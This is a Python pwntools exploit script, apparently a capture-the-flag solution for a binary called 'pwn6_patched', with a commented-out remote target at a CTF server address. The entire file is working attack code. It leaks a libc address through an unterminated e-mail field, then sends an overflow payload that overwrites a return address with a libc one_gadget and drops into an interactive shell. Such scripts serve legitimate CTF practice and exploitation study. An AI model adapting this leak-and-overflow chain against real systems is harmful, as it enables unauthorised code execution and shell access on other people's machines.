#!/usr/bin/env python3
from pwn import *
exe = ELF('pwn6_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

p = process(exe.path)
# p = remote('103.197.184.48', 13330)

input()
#leak libc
p.sendlineafter(b'> ', str(1))
p.sendlineafter(b'[1-5]: ', str(6))
p.sendlineafter(b'Count: ', str(0))
p.sendlineafter(b'[y/n]: ', b'y')
p.sendlineafter(b'soon: ', str(8))
payload = b'a'*8
p.sendafter(b'e-mail: ', payload)
p.recvuntil(b'a'*8)
libc_leak = u64(p.recvline()[:-1] + b'\0\0')
libc.address = libc_leak - libc.sym['_IO_file_overflow'] - 275 #server
print("libc leak: ", hex(libc_leak))
print("libc base: ", hex(libc.address))
p.sendlineafter(b'[y/n]: ', b'y')

one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]

#exit
p.sendlineafter(b'>> ', str(1))
p.sendlineafter(b'[1-5]: ', str(6))
p.sendlineafter(b'Count: ', str(0))
p.sendlineafter(b'[y/n]: ', b'y')
p.sendlineafter(b'soon: ', str(0x60))
payload = b'a'*0x58
payload += p64(libc.address + one_gadget[1])
p.sendafter(b'e-mail: ', payload)
p.sendlineafter(b'[y/n]: ', b'y')

# p.sendlineafter(b'>> ', str(4))
# p.sendlineafter(b'Name: ', b'abcd')
# p.sendlineafter(b'Age: ', str(256))
# payload = b'a'*247
# payload += p64(libc.address + one_gadget[1])
# p.sendafter(b'background: ', payload)


p.interactive()